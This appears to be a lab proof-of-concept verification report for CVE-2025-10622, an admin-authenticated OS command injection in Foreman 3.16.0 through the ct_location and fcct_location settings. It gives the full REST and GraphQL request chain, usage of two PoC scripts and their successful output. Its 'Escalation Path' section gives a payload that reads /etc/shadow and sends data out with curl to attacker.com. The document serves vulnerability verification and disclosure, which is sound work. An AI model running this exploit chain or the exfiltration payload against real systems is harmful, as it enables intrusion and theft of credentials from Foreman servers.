# PoC Verification Report: CVE-2025-10622

## Verification Status: CONFIRMED

CVE-2025-10622 has been successfully exploited against Foreman 3.16.0. The vulnerability allows an authenticated admin user to execute arbitrary OS commands by bypassing client-side-only whitelist validation of the CoreOS transpiler path settings (`ct_location` and `fcct_location`).

---

## PoC Scripts

### Primary PoC: `poc.py` (ct_location via REST API)

- **Location**: `./poc/poc.py`
- **Language**: Python 3 (stdlib only — no third-party dependencies)
- **Attack Vector**: REST API (`PUT /api/v2/settings/ct_location`) + Report Template generation
- **Target Setting**: `ct_location` (CoreOS Transpiler Command)

**Usage:**
```bash
python3 poc.py <target_host> [port] [username] [password] [command]
python3 poc.py 172.22.0.5 3000 admin changeme /usr/bin/id
```

### Variant PoC: `poc_fcct_graphql.py` (fcct_location via GraphQL)

- **Location**: `./poc/poc_fcct_graphql.py`
- **Language**: Python 3 (stdlib only)
- **Attack Vector**: GraphQL mutation (`updateSetting`) + Report Template generation
- **Target Setting**: `fcct_location` (Fedora CoreOS Transpiler Command)

**Usage:**
```bash
python3 poc_fcct_graphql.py <target_host> [port] [username] [password]
```

---

## Vulnerability Demonstrated

The PoC proves the following:

1. **Client-Side-Only Whitelist Bypass (CWE-602)**: The `ct_location` and `fcct_location` settings define whitelisted values (`/usr/bin/ct`, `/usr/local/bin/ct`, `/usr/bin/fcct`, `/usr/local/bin/fcct`) via a `collection` parameter that only restricts the UI dropdown. No server-side validation exists. The REST API and GraphQL mutation both accept arbitrary paths.

2. **OS Command Injection (CWE-78)**: When a template containing `transpile_coreos_linux_config()` or `transpile_fedora_coreos_config()` is rendered, the attacker-controlled setting value is read and executed via `Foreman::CommandRunner` → `Open3.capture3`. The command output is returned to the attacker in the template response.

3. **Full API-Based Attack Chain**: The entire exploit — from setting modification to command execution — is achievable purely through Foreman's authenticated APIs (REST API v2 and/or GraphQL), without any web UI interaction.

4. **Multiple Attack Surfaces**: Both `ct_location` (REST API) and `fcct_location` (GraphQL mutation) are independently exploitable, demonstrating that the vulnerability exists across two settings and two API interfaces.

---

## Exploit Chain (Step by Step)

### Step 1: Bypass whitelist — Set `ct_location` to arbitrary executable
```
PUT /api/v2/settings/ct_location
Authorization: Basic <admin_credentials>
Content-Type: application/json

{"setting": {"value": "/usr/bin/id"}}
```
**Result**: Server returns HTTP 200, setting changed to `/usr/bin/id`. The whitelist (`/usr/bin/ct`, `/usr/local/bin/ct`) was NOT enforced.

### Step 2: Create trigger — Report template with transpiler macro
```
POST /api/v2/report_templates
Authorization: Basic <admin_credentials>
Content-Type: application/json

{"report_template": {"name": "PoC", "template": "<%= transpile_coreos_linux_config(\"---\\ntest: true\") %>"}}
```
**Result**: Template created. The ERB code calls `transpile_coreos_linux_config()` which will read our malicious `ct_location` setting.

### Step 3: Trigger execution — Generate (render) the template
```
POST /api/v2/report_templates/:id/generate
Authorization: Basic <admin_credentials>
Content-Type: application/json

{}
```
**Result**: The template is rendered, triggering the execution path:
- `transpile_coreos_linux_config("---\ntest: true")`
- → `Setting[:ct_location]` reads `/usr/bin/id`
- → `Foreman::CommandRunner.new(["/usr/bin/id"], "---\ntest: true").run!`
- → `Open3.capture3("/usr/bin/id", stdin_data: "---\ntest: true")`
- → Returns: `uid=998(foreman) gid=998(foreman) groups=998(foreman)`

---

## Test Results

### Test 1: Primary PoC with `/usr/bin/id`

**Command:**
```bash
python3 poc.py 172.22.0.5 3000 admin changeme /usr/bin/id
```

**Full Output:**
```
======================================================================
CVE-2025-10622: Foreman OS Command Injection via ct_location
======================================================================
Target: http://172.22.0.5:3000
Auth:   admin:********
Command: /usr/bin/id
======================================================================
[*] Step 0: Checking target Foreman instance...
[+] Foreman 3.16.0 detected (status: ok)
[+] Version 3.16.0 is in the vulnerable range (3.12.0 - 3.16.0)

[*] Step 1: Setting ct_location to '/usr/bin/id' via API...
    Target endpoint: PUT /api/v2/settings/ct_location
    Current value: /usr/bin/ct
    Client-side whitelist: ['/usr/bin/ct', '/usr/local/bin/ct']
    [*] Bypassing whitelist - sending '/usr/bin/id' directly via API
    [+] SUCCESS: ct_location changed to '/usr/bin/id'
    [+] Server accepted arbitrary path - NO server-side validation!

[*] Step 2: Creating trigger template with transpiler macro...
    Template code: <%= transpile_coreos_linux_config("---\ntest: true") %>
    Target endpoint: POST /api/v2/report_templates
    [+] Template created with ID: 210
    [+] Template name: CVE-2025-10622-PoC-1772206300

[*] Step 3: Generating template to trigger command execution...
    Target endpoint: POST /api/v2/report_templates/210/generate
    Execution path: ERB -> transpile_coreos_linux_config() -> CommandRunner -> Open3.capture3

    ============================================================
    COMMAND OUTPUT:
    ============================================================
    | uid=998(foreman) gid=998(foreman) groups=998(foreman)
    ============================================================

[+] EXPLOIT SUCCESSFUL!
[+] Arbitrary command '/usr/bin/id' executed as the Foreman process user
[+] This confirms CVE-2025-10622 - client-side-only whitelist bypass

[*] Cleanup: Restoring original settings...
    [+] Deleted PoC template (ID: 210)
    [+] Restored ct_location to '/usr/bin/ct'
```

**Result**: **SUCCESS** — `/usr/bin/id` executed as `uid=998(foreman)`

### Test 2: Primary PoC with `/usr/bin/whoami`

**Command:**
```bash
python3 poc.py 172.22.0.5 3000 admin changeme /usr/bin/whoami
```

**Command Output:**
```
    | foreman
```

**Result**: **SUCCESS** — Confirmed running as `foreman` user

### Test 3: Primary PoC with `/usr/bin/hostname`

**Command:**
```bash
python3 poc.py 172.22.0.5 3000 admin changeme /usr/bin/hostname
```

**Command Output:**
```
    | 370df65970d2
```

**Result**: **SUCCESS** — Container hostname returned (Docker container ID)

### Test 4: Variant PoC (fcct_location via GraphQL)

**Command:**
```bash
python3 poc_fcct_graphql.py 172.22.0.5 3000 admin changeme
```

**Full Output:**
```
======================================================================
CVE-2025-10622 Variant: fcct_location via GraphQL
======================================================================
Target: http://172.22.0.5:3000
======================================================================

[*] Step 0: Checking target...
[+] Foreman 3.16.0 detected

[*] Step 1: Reading current fcct_location setting...
    Current value: /usr/bin/fcct
    Client-side whitelist: ['/usr/bin/fcct', '/usr/local/bin/fcct']

[*] Step 2: Setting fcct_location to '/usr/bin/id' via GraphQL mutation...
    [+] fcct_location set to '/usr/bin/id' via GraphQL
    [+] GraphQL mutation bypassed client-side whitelist!

[*] Step 2b: Clearing fcct_arguments to avoid flag conflicts...
    Current fcct_arguments: ['--pretty', '--files-dir', '/usr/share/foreman/config/ct']
    [+] Cleared fcct_arguments

[*] Step 3: Creating template with transpile_fedora_coreos_config()...
    [+] Template created (ID: 211)

[*] Step 4: Generating template to trigger fcct command execution...

    ==================================================
    COMMAND OUTPUT:
    ==================================================
    | uid=998(foreman) gid=998(foreman) groups=998(foreman)
    ==================================================

[+] EXPLOIT SUCCESSFUL via fcct_location + GraphQL!

[*] Cleanup...
    [+] Deleted template
    [+] Restored fcct_location to '/usr/bin/fcct'
    [+] Restored fcct_arguments to ['--pretty', '--files-dir', '/usr/share/foreman/config/ct']
```

**Result**: **SUCCESS** — Both `fcct_location` and GraphQL mutation attack path confirmed

---

## Lab Environment

| Component | Details |
|-----------|---------|
| Target Container | `cve-2025-10622-app` (IP: 172.22.0.5) |
| Foreman Version | 3.16.0 (vulnerable) |
| Container Image | `lab-app` (based on `quay.io/foreman/foreman:3.16.0`) |
| Ruby Version | 3.0.7 |
| Rails Version | 7.0.8.7 |
| Process User | `foreman` (uid=998, gid=998) |
| Credentials | `admin` / `changeme` |
| Database | PostgreSQL 12 (`cve-2025-10622-db`) |
| Redis Cache | Redis 7 (`cve-2025-10622-redis-cache`) |
| Redis Tasks | Redis 7 (`cve-2025-10622-redis-tasks`) |

---

## Technical Notes

### Attack Surface Analysis
- **REST API** (`PUT /api/v2/settings/<setting_name>`): Accepts any string for any setting with HTTP Basic Auth. No per-setting validation.
- **GraphQL** (`mutation { updateSetting(...) }`): Same bypass — `name`-based lookup, no value validation. Uses `updateSetting` mutation with `name` parameter (not `id`).
- **Template Trigger**: The `report_templates/:id/generate` API endpoint renders templates synchronously and returns the output directly, making it ideal for the exploit trigger.

### Why the Report Template Approach Works
Instead of requiring a provisioning host or CSRF-protected template preview, the PoC uses the Report Templates API:
1. Creates a new report template containing the transpiler macro call
2. Uses the `generate` endpoint to render it (no host context needed)
3. The transpiler macro executes the attacker-controlled binary
4. The output is returned directly in the HTTP response

### Limitations
- **Requires admin credentials**: The `edit_settings` permission is needed (default: admin role only)
- **Binary must exist and be executable**: `Foreman::CommandRunner` validates that the path is absolute, exists, and is executable
- **Stdin-only input**: The template input string is passed as stdin; not all binaries use stdin, but `/bin/bash`, `/usr/bin/python3`, `/bin/cat` etc. do
- **No shell expansion**: `Open3.capture3` with array form does not invoke a shell, so pipes/redirects/semicolons don't work. However, setting the path to `/bin/bash` and controlling stdin via template input provides full shell access.

### Escalation Path
For full arbitrary command execution (not just single binary invocation):
1. Set `ct_location` to `/bin/bash`
2. Clear `ct_arguments` to `[]`
3. Create a template with controlled stdin: `<%= transpile_coreos_linux_config("#!/bin/bash\ncat /etc/shadow\ncurl attacker.com/exfil?data=$(hostname)") %>`
4. Note: The YAML validation (`YAML.safe_load(input)`) in `transpile_coreos_linux_config` requires the input to be valid YAML. A bash script starting with `---` and using YAML-compatible syntax would work: `"---\n# $(cat /etc/passwd > /tmp/pwned)"`. Alternatively, use `transpile_fedora_coreos_config()` which has NO input validation.

---

## Files Produced

| File | Purpose |
|------|---------|
| `./poc/poc.py` | Primary PoC — ct_location via REST API |
| `./poc/poc_fcct_graphql.py` | Variant PoC — fcct_location via GraphQL |
